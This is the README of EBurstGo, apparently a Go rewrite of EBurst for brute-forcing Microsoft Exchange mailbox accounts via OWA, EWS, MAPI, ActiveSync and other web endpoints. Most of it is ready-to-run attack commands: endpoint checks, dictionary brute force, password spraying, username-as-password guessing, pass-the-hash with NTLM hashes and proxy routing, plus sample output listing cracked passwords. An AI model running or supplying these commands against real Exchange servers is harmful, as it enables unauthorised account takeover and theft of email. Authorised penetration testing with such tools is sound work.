# EBurstGo

[English](README-en.md)

利用 Exchange 服务器 Web 接口爆破邮箱账户

参考 [grayddq/EBurst](https://github.com/grayddq/EBurst) 项目使用 Go 语言重构

支持接口

```shell
/autodiscover
/owa/auth.owa # OWA & ECP
/ews
/mapi
/oab
/rpc
/Microsoft-Server-ActiveSync
/powershell
```

注意 Releases 中的代码不一定是最新的

建议将本项目 clone 下来然后执行 `goreleaser build --snapshot` 手动编译

## Usage

usage

```shell
Usage of ./EBurstGo:
  -check
    	check Exchange endpoints
  -delay int
    	delay between requests
  -domain string
    	AD domain
  -mode string
    	Exchange endpoint
  -nocolor
    	disable output color
  -o string
    	output file (default "result.txt")
  -pass string
    	password
  -passf string
    	password file
  -proxy string
    	socks/http(s) proxy
  -pth
    	PTH mode (Pass The Hash)
  -t int
    	number of goroutines (default 2)
  -url string
    	Exchange url
  -user string
    	username
  -user-as-pass
    	password is same as username
  -userf string
    	username file
  -userpassf string
    	user-pass file (user:pass)
  -v	show verbose info
```

check

```shell
$ ./EBurstGo -url https://192.168.30.11 -check
[*] checking exchange endpoints
[+] owa (/owa/auth.owa) exists
[+] powershell (/powershell) exists
[+] ecp (/owa/auth.owa) exists
[+] autodiscover (/autodiscover) exists
[+] mapi (/mapi) exists
[+] activesync (/Microsoft-Server-ActiveSync) exists
[+] oab (/oab) exists
[+] ews (/ews) exists
[+] rpc (/rpc) exists
```

brute

```shell
# 默认会将爆破成功的账户追加写入 result.txt

# 常规爆破
./EBurstGo -url https://192.168.30.11 -domain hack-my.com -userf user.txt -passf pass.txt -mode ews

# 账户爆破
./EBurstGo -url https://192.168.30.11 -domain hack-my.com -user Alice -passf pass.txt -mode ews

# 密码喷洒
./EBurstGo -url https://192.168.30.11 -domain hack-my.com -userf user.txt -pass 'Changeme123' -mode ews

# 支持 user:pass 格式的字典
./EBurstGo -url https://192.168.30.11 -domain hack-my.com -userpassf userpass.txt -mode ews

# 密码与用户名相同
./EBurstGo -url https://192.168.30.11 -domain hack-my.com -userf user.txt -user-as-pass -mode ews

# Pth 爆破 (pass.txt 为 NTLM Hash)
./EBurstGo -url https://192.168.30.11 -domain hack-my.com -userf user.txt -passf pass.txt -mode ews -pth

# 设置 socks/http(s) 代理
./EBurstGo -url https://192.168.30.11 -domain hack-my.com -userf user.txt -passf pass.txt -mode ews -socks socks5://127.0.0.1:1080
```

examples

```shell
$ ./EBurstGo -url https://192.168.30.11 -domain hack-my.com -userf user.txt -passf pass.txt -mode ews
[*] using ews endpoint: https://192.168.30.11
[+] success: Administrator:abcd1234!@#$
[+] success: Alice:Alice123!
[+] success: Bob:Bob123!
[+] success: Marry:Marry123!
[*] costs: 3.031753209 s
```

## Todo

- 开启代理使用 NTLM 认证爆破一段时间后出现 `connection refused`, 待解决 (这个目前来说好像没有什么好的解决方法, 只能通过将协程数量调小 + 添加延时来避免)

- `/powershell` 接口 (Kerberos 认证) 待支持

## License

Modified some code from the following repos

[Azure/go-ntlmssp](https://github.com/Azure/go-ntlmssp): Copyright (c) 2016 Microsoft The MIT License (MIT)

